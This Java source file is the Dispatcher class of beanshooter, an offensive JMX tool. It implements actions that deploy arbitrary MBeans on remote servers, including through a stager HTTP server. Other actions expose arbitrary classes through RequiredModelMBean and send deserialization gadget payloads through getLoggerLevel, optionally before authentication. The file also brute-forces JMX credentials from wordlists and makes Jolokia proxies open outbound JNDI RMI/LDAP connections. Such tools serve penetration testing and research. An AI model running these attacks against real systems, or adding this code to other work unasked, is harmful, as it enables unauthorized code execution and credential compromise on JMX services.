package de.qtc.beanshooter.operation;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Scanner;
import java.util.Set;

import javax.management.Attribute;
import javax.management.MBeanException;
import javax.management.MBeanParameterInfo;
import javax.management.MBeanServerConnection;
import javax.management.ObjectInstance;
import javax.management.ObjectName;
import javax.management.ReflectionException;
import javax.management.RuntimeMBeanException;
import javax.management.modelmbean.ModelMBeanAttributeInfo;
import javax.management.modelmbean.ModelMBeanInfo;
import javax.management.modelmbean.ModelMBeanInfoSupport;
import javax.management.modelmbean.ModelMBeanOperationInfo;
import javax.management.modelmbean.RequiredModelMBean;

import org.jolokia.client.exception.J4pRemoteException;

import de.qtc.beanshooter.cli.ArgumentHandler;
import de.qtc.beanshooter.exceptions.AuthenticationException;
import de.qtc.beanshooter.exceptions.ExceptionHandler;
import de.qtc.beanshooter.io.Logger;
import de.qtc.beanshooter.io.WordlistHandler;
import de.qtc.beanshooter.mbean.DynamicMBean;
import de.qtc.beanshooter.mbean.IMBean;
import de.qtc.beanshooter.mbean.MBean;
import de.qtc.beanshooter.networking.StagerServer;
import de.qtc.beanshooter.plugin.PluginSystem;
import de.qtc.beanshooter.utils.DeserializationCanary;
import de.qtc.beanshooter.utils.Utils;

/**
 * The dispatcher class is responsible for dispatching the different beanshooter actions.
 * This class implements the main logic of the different beanshooter actions.
 *
 * @author Tobias Neitzel (@qtc_de)
 */
public class Dispatcher {

    private MBeanServerClient client;
    private MBeanServerConnection conn;

    /**
     * Obtain an MBeanServer connection. The connection is created using the PluginSystem
     * and cached within the Dispatcher class. Followup calls will use the cached MBeanServerConnection.
     *
     * @return MBeanServerConnection to the remote MBeanServer
     */
    protected MBeanServerConnection getMBeanServerConnection()
    {
        if( conn == null )
            conn = getMBeanServerConnection(ArgumentHandler.getEnv());

        return conn;
    }

    /**
     * Obtain an MBeanServer connection.
     *
     * @return MBeanServerConnection to the remote MBeanServer
     */
    protected MBeanServerConnection getMBeanServerConnection(Map<String,Object> env)
    {
        String host = ArgumentHandler.require(BeanshooterOption.TARGET_HOST);
        int port = ArgumentHandler.require(BeanshooterOption.TARGET_PORT);

        return PluginSystem.getMBeanServerConnection(host, port, env);
    }

    /**
     * Obtain an MBeanServer connection. The connection is created using the PluginSystem
     * and cached within the Dispatcher class. Followup calls will use the cached MBeanServerConnection.
     *
     * @return MBeanServerConnection to the remote MBeanServer
     */
    protected MBeanServerClient getMBeanServerClient()
    {
        if( client != null )
            return client;

        if( conn == null )
            getMBeanServerConnection();

        client = new MBeanServerClient(conn);
        return client;
    }

    /**
     * Deploys the user specified MBean on the remote MBeanServer.
     */
    public void deploy()
    {
        Logger.printlnBlue("Starting MBean deployment.");
        Logger.lineBreak();
        Logger.increaseIndent();

        String mBeanClassName = ArgumentHandler.require(BeanshooterOption.DEPLOY_BEAN_CLASS);
        ObjectName mBeanObjectName = Utils.getObjectName(ArgumentHandler.require(BeanshooterOption.DEPLOY_BEAN_NAME));

        MBeanServerClient mBeanServerClient = getMBeanServerClient();
        mBeanServerClient.deployMBean(mBeanClassName, mBeanObjectName, BeanshooterOption.DEPLOY_JAR_FILE.getValue());

        Logger.decreaseIndent();
    }

    /**
     * Creates a new RequiredModelMBean on the remote MBean server that allows access to a user specified
     * class.
     */
    public void model()
    {
        String className = ArgumentHandler.require(BeanshooterOption.MODEL_CLASS_NAME);
        ObjectName mBeanObjectName = Utils.getObjectName(ArgumentHandler.require(BeanshooterOption.MODEL_OBJ_NAME));

        MBeanServerClient mBeanServerClient = getMBeanServerClient();

        try {
            Class<?> cls = Class.forName(className);
            ModelMBeanOperationInfo[] ops = Utils.createModelMBeanInfosFromClass(cls);

            Logger.printlnBlue("Deploying RequiredModelMBean supporting methods from " + cls.getName());
            Logger.lineBreak();
            Logger.increaseIndent();

            ModelMBeanInfo mmbi = new ModelMBeanInfoSupport(cls.getName(), "ModelMBean", new ModelMBeanAttributeInfo[] {}, null, ops, null);
            mBeanServerClient.deployMBean(RequiredModelMBean.class.getName(), mBeanObjectName, null, new Object[] { mmbi }, new String[] { ModelMBeanInfo.class.getName() });

            Logger.lineBreak();
            Logger.printlnYellow("Available Methods:");

            for (ModelMBeanOperationInfo op : ops)
            {
                String ret = op.getReturnType();
                String name = op.getName();
                StringBuilder args = new StringBuilder();

                for (MBeanParameterInfo param : op.getSignature())
                {
                    args.append(param.getType());
                    args.append(", ");
                }

                if (op.getSignature().length > 0)
                    args.setLength(args.length() - 2);

                Logger.printMixedBlue("  -", ret + " ");
                Logger.printPlainYellow(name);
                Logger.printlnPlainBlue("(" + args.toString() + ")");
            }
        }

        catch (ClassNotFoundException e)
        {
            Logger.eprintlnMixedYellow("The specified class", className, "cannot be found.");
            Utils.exit();
        }

        if (BeanshooterOption.MODEL_RESOURCE.notNull())
        {
            Object managedResource = PluginSystem.strToObj(BeanshooterOption.MODEL_RESOURCE.getValue());

            try
            {
                Logger.lineBreak();
                Logger.printlnMixedYellow("Setting managed resource to:", BeanshooterOption.MODEL_RESOURCE.getValue());
                mBeanServerClient.invoke(mBeanObjectName, "setManagedResource", new String[] { Object.class.getName(), "java.lang.String" }, managedResource, "objectReference");
                Logger.printlnMixedBlue("Managed resource was set", "successfully.");
            }

            catch (MBeanException | ReflectionException | IOException e)
            {
                ExceptionHandler.internalError("model", "Caught" + e.getClass().getName() + "while invoking setManagedResource.");
            }
        }

        Logger.decreaseIndent();
    }

    /**
     * Removes the specified MBean from the remote MBeanServer.
     */
    public void undeploy()
    {
        ObjectName mBeanObjectName = Utils.getObjectName(ArgumentHandler.require(BeanshooterOption.UNDEPLOY_BEAN_NAME));

        MBeanServerClient mBeanServerClient = getMBeanServerClient();
        mBeanServerClient.unregisterMBean(mBeanObjectName);
    };

    /**
     * Enumerate common vulnerabilities on the targeted JMX server.
     */
    public void enumerate()
    {
        boolean access = false;
        boolean enumerated = false;

        String host = ArgumentHandler.require(BeanshooterOption.TARGET_HOST);
        int port = ArgumentHandler.require(BeanshooterOption.TARGET_PORT);

        EnumHelper enumHelper = new EnumHelper(host, port);
        enumHelper.boundNames();

        if (BeanshooterOption.CONN_JMXMP.getBool() && BeanshooterOption.CONN_SASL.isNull())
        {
            access = enumHelper.enumSASL();
            Logger.lineBreak();

            if (!BeanshooterOption.CONN_SASL.isNull())
                enumerated = true;
        }

        if (!access)
        {
            if (BeanshooterOption.CONN_USER.notNull() && BeanshooterOption.CONN_PASS.notNull())
            {
                access = enumHelper.login();
                Logger.lineBreak();
            }

            else if (BeanshooterOption.CONN_SASL.isNull())
            {
                access = enumHelper.enumAccess();
                Logger.lineBreak();
            }

            else if (!enumerated)
            {
                Logger.printlnBlue("Checking servers SASL configuration");
                Logger.lineBreak();
                Logger.increaseIndent();

                Logger.printlnMixedBlue("- SASL profile was manually specified but", "no credentials", "were provided.");
                Logger.printMixedYellow("  Use the", "--username", "and ");
                Logger.printlnPlainMixedYellowFirst("--password", "options to provide credentials.");
                Logger.statusUndecided("Configuration");

                Logger.decreaseIndent();
                Logger.lineBreak();
            }
        }

        if (BeanshooterOption.CONN_JOLOKIA.getBool())
            enumHelper.enumJolokiaVersion();

        else
            enumHelper.enumSerial();

        if (!access)
            return;

        if (BeanshooterOption.CONN_JOLOKIA.getBool())
        {
            Logger.lineBreak();
            enumHelper.enumJolokiaProxy();
        }

        Logger.lineBreak();
        Set<ObjectInstance> mbeans = enumHelper.enumMBeans();
        MBean.performEnumActions(mbeans);
    }

    /**
     * The serial action performs an deserialization attack on the remote MBeanServer. It uses the
     * getLoggerLevel function for this purpose, as it expects an arbitrary Object as argument.
     */
    public void serial()
    {
        if (BeanshooterOption.CONN_JOLOKIA.getBool())
        {
            Logger.eprintlnMixedYellow("The serial action", "is not", "supported for Jolokia based connections.");
            Utils.exit();
        }

        Logger.println("Attemting deserialization attack on JMX endpoint.");
        Logger.lineBreak();
        Logger.increaseIndent();

        Object payloadObject = ArgumentHandler.getInstance().getGadget();

        if (!BeanshooterOption.SERIAL_NO_CANARY.getBool())
            payloadObject = new Object[] { payloadObject, new DeserializationCanary() };

        try
        {
            if (BeanshooterOption.CONN_JMXMP.getBool())
                SerialHelper.serialJMXMP(payloadObject);

            else if (BeanshooterOption.SERIAL_PREAUTH.getBool())
                SerialHelper.serialPreauth(payloadObject);

            else
            {
                String host = ArgumentHandler.require(BeanshooterOption.TARGET_HOST);
                int port = ArgumentHandler.require(BeanshooterOption.TARGET_PORT);

                conn = PluginSystem.getMBeanServerConnectionUmanaged(host, port, ArgumentHandler.getEnv());
                client = new MBeanServerClient(conn);
                ObjectName loggingMBean = Utils.getObjectName("java.util.logging:type=Logging");

                client.invoke(loggingMBean, "getLoggerLevel", null, payloadObject);
            }

        } catch ( MBeanException | ReflectionException  e) {

            Throwable t = ExceptionHandler.getCause(e);

            if( t instanceof ClassNotFoundException)
                ExceptionHandler.deserialClassNotFound((ClassNotFoundException)t);

            else
                Logger.eprintlnMixedYellow("Encountered unexpected", t.getClass().getName(), "after the payload object was sent.");

            ExceptionHandler.showStackTrace(e);

        } catch (RuntimeMBeanException | SecurityException e) {

            Throwable t = ExceptionHandler.getCause(e);
            Logger.eprintlnMixedYellow("Caught", t.getClass().getName(), "after the payload object was sent.");

            if( t instanceof IllegalArgumentException || t instanceof SecurityException )
                Logger.eprintlnMixedBlue("Payload object probably", "worked anyway.");

            ExceptionHandler.showStackTrace(e);

        } catch( java.rmi.UnmarshalException e) {

            Throwable t = ExceptionHandler.getCause(e);

            if( t instanceof ClassNotFoundException)
                ExceptionHandler.deserialClassNotFound((ClassNotFoundException)t);

            else
                Logger.eprintlnMixedYellow("Encountered unexpected", t.getClass().getName(), "after the payload object was sent.");

            ExceptionHandler.showStackTrace(e);

        }

        catch (AuthenticationException e)
        {
            ExceptionHandler.handleAuthenticationException(e);
            Logger.printlnMixedYellow("Use the", "--preauth", "option to launch deserialization attacks before authentication.");
        }

        catch (IOException e)
        {
            Throwable t = ExceptionHandler.getCause(e);

            if (t instanceof ClassNotFoundException)
                ExceptionHandler.deserialClassNotFound((ClassNotFoundException)t);

            else
                Logger.eprintlnMixedYellow("Encountered unexpected", t.getClass().getName(), "after the payload object was sent.");

            ExceptionHandler.showStackTrace(e);
        }

        catch (J4pRemoteException e)
        {
            // Actually unreachable code, as serial action is not supported for Jolokia
            ExceptionHandler.handleJ4pRemoteException(e, "during deserialization attack");
        }
    };

    /**
     * Attempt to bruteforce valid credentials on the targeted JMX endpoint.
     */
    public void brute()
    {
        String host = ArgumentHandler.require(BeanshooterOption.TARGET_HOST);
        int port = ArgumentHandler.require(BeanshooterOption.TARGET_PORT);

        Logger.printlnMixedYellow("Reading wordlists for the", "brute", "action.");
        Logger.increaseIndent();

        Map<String,Set<String>> bruteMap = WordlistHandler.getCredentialMap();

        Logger.decreaseIndent();
        Logger.lineBreak();

        CredentialGuesser guesser = new CredentialGuesser(host, port, bruteMap);
        guesser.startGuessing();
    };

    /**
     * List available MBeans on the remote MBeanServer.
     */
    public void list()
    {
        MBeanServerClient mBeanServerClient = getMBeanServerClient();
        Set<ObjectInstance> instances = mBeanServerClient.getMBeans();
        List<String> interestingMBeans = MBean.getBeanClasses();

        Logger.println("Available MBeans:");
        Logger.lineBreak();
        Logger.increaseIndent();

        for(ObjectInstance instance : instances)
        {
            if( BeanshooterOption.LIST_FILTER_CLASS.notNull() &&
                !instance.getClassName().toLowerCase().contains(BeanshooterOption.LIST_FILTER_CLASS.getValue()))
            {
                continue;
            }

            if( BeanshooterOption.LIST_FILTER_OBJ.notNull() &&
                !instance.getObjectName().toString().toLowerCase().contains(BeanshooterOption.LIST_FILTER_OBJ.getValue()))
            {
                continue;
            }

            if (interestingMBeans.contains(instance.getClassName()))
                Logger.printMixedRed("  -", instance.getClassName(), "");
            else
                Logger.printMixedYellow("  -", instance.getClassName(), "");

            Logger.printlnPlainBlue("(" + instance.getObjectName().toString() + ")");
        }

        Logger.decreaseIndent();
    };

    /**
     * Invoke a method on an MBean. This allows the user to manually specify an object name, a method name
     * and the desired arguments and invokes the corresponding call on the MBeanServer.
     */
    public void invoke()
    {
        ObjectName objectName = Utils.getObjectName(ArgumentHandler.require(BeanshooterOption.INVOKE_OBJ_NAME));
        String signature = ArgumentHandler.require(BeanshooterOption.INVOKE_METHOD);
        List<String> argumentStringArray = BeanshooterOption.INVOKE_METHOD_ARGS.getValue();

        String[] argumentTypes = PluginSystem.getArgumentTypes(signature);
        Object[] argumentArray = PluginSystem.getArgumentArray(argumentStringArray.toArray(new String[0]));
        String methodName = PluginSystem.getMethodName(signature);

        MBeanServerClient client = getMBeanServerClient();

        try
        {
            Object result = client.invoke(objectName, methodName, argumentTypes, argumentArray);

            if( result != null )
                PluginSystem.handleResponse(result);
            else
                Logger.printlnBlue("Call was successful.");
        }

        catch (MBeanException | ReflectionException | IOException e)
        {
            Throwable t = ExceptionHandler.getCause(e);
            String message = t.getMessage();

            if (message != null && message.contains("No operation " + methodName))
            {
                if (message.contains("Known signatures: "))
                    ExceptionHandler.noOperationAlternative(e, signature, methodName, message);

                ExceptionHandler.noOperation(e, signature);
            }

            Logger.eprintlnMixedYellow("Caught", e.getClass().getName(), String.format("while invoking %s on %s.", methodName, objectName.toString()));
            Logger.eprintln("beanshooter does not handle exceptions for custom method invocations.");
            ExceptionHandler.stackTrace(e);
        }
    }

    /**
     * Start the stager server and serve the MBean specified by the command line parameters.
     */
    public void stager()
    {
        int port = BeanshooterOption.STAGER_PORT.getValue();
        String host = BeanshooterOption.STAGER_HOST.getValue();

        StagerServer server = new StagerServer(host, port, true);

        String url = BeanshooterOption.DEPLOY_STAGER_URL.getValue(String.format("http://%s:%d", host, port));
        IMBean bean = de.qtc.beanshooter.mbean.mlet.Dispatcher.getMbean();

        server.start(Utils.parseUrl(url), bean.getJarName(), bean.getMBeanClass(), bean.getObjectName().toString());
        Logger.print("Press Enter to stop listening.");

        try (Scanner scanner = new Scanner(System.in))
        {
            scanner.nextLine();
        }

        catch (java.util.NoSuchElementException e)
        {
            Logger.printlnPlain("");
        }

        server.stop();
    }

    /**
     * Sets or gets an attribute on the targeted MBean.
     */
    public void attr()
    {
        Attribute attrObj = null;
        ObjectName objectName = Utils.getObjectName(ArgumentHandler.require(BeanshooterOption.INVOKE_OBJ_NAME));

        String attrName = ArgumentHandler.require(BeanshooterOption.ATTR_ATTRIBUTE);
        String attrValue = BeanshooterOption.ATTR_VALUE.getValue(null);
        String typeName = BeanshooterOption.ATTR_TYPE.getValue("String");

        if (attrValue != null)
        {
            String signature = String.format("void dummy(%s p1)", typeName);
            PluginSystem.getArgumentTypes(signature);
            Object[] argumentArray = PluginSystem.getArgumentArray(new String[] { attrValue });

            attrObj = new Attribute(attrName, argumentArray[0]);
        }

        MBeanServerClient client = getMBeanServerClient();

        try
        {
            if (attrObj != null)
                client.setAttribute(objectName, attrObj);

            else
            {
                Object result = client.getAttribute(objectName, attrName);

                if( result != null )
                    PluginSystem.handleResponse(result);
                else
                    Logger.println("null");
            }
        }

        catch (MBeanException | ReflectionException | IOException e)
        {
            if (e instanceof ReflectionException && e.getMessage().contains("Cannot find setter method"))
            {
                Logger.eprintlnMixedYellow("Caught", e.getClass().getName(), String.format("while setting attribute %s from %s", attrName, objectName));
                Logger.eprintlnMixedBlue("There seems to be", "no setter available", "for the requested attribute.");
                ExceptionHandler.showStackTrace(e);
                Utils.exit();
            }

            Logger.eprintlnMixedYellow("Caught", e.getClass().getName(), String.format("while accessing attribute %s from %s", attrName, objectName));
            Logger.eprintln("beanshooter does not handle exceptions for custom attribute access.");
            ExceptionHandler.stackTrace(e);
            Utils.exit();
        }
    }

    /**
     * Create a DynamicMBean from the user supplied input and invoke the info action on it.
     */
    public void info()
    {
        List<ObjectName> objectNames = new ArrayList<ObjectName>();

        if (BeanshooterOption.OBJ_NAME.notNull())
        {
            ObjectName mBeanObjectName = Utils.getObjectName(BeanshooterOption.OBJ_NAME.getValue());
            objectNames.add(mBeanObjectName);
        }

        else
        {
            Set<ObjectInstance> instances = getMBeanServerClient().getMBeans();
            for (ObjectInstance inst : instances)
                objectNames.add(inst.getObjectName());
        }

        for (ObjectName objName : objectNames)
        {
            DynamicMBean mbean = new DynamicMBean(objName, null, null);
            de.qtc.beanshooter.mbean.Dispatcher disp = new de.qtc.beanshooter.mbean.Dispatcher(mbean);
            disp.info();
        }
    }

    /**
     * Create an outbound RMI or LDAP connection from a Jolokia endpoint running in proxy mode.
     */
    public void jolokia()
    {
        BeanshooterOption.CONN_JOLOKIA.setValue(true);
        PluginSystem.init(null);

        String host = ArgumentHandler.require(BeanshooterOption.JOLOKIA_HOST);
        int port = ArgumentHandler.require(BeanshooterOption.JOLOKIA_PORT);

        String name = BeanshooterOption.JOLOKIA_LOOKUP.getValue("beanshooter");
        String proxyUrl = "";

        if (BeanshooterOption.JOLOKIA_LDAP.getBool())
            proxyUrl = String.format("service:jmx:Rmi:///jndi/ldap://%s:%d/%s", host, port, name);

        else
            proxyUrl = String.format("service:jmx:Rmi:///jndi/rmi://%s:%d/%s", host, port, name);

        BeanshooterOption.CONN_JOLOKIA_PROXY.setValue(proxyUrl);
        Logger.printlnMixedYellow("Attempting to trigger outboud connection to", String.format("%s:%d", host, port));
        Logger.printlnMixedBlue("Using proxy service URL:", proxyUrl);

        MBeanServerClient mBeanServerClient = getMBeanServerClient();
        mBeanServerClient.getMBeans();

        Logger.printlnMixedYellow("Obtained", "no Exception", "while performing the list operation via the specified proxy.");
    }
}
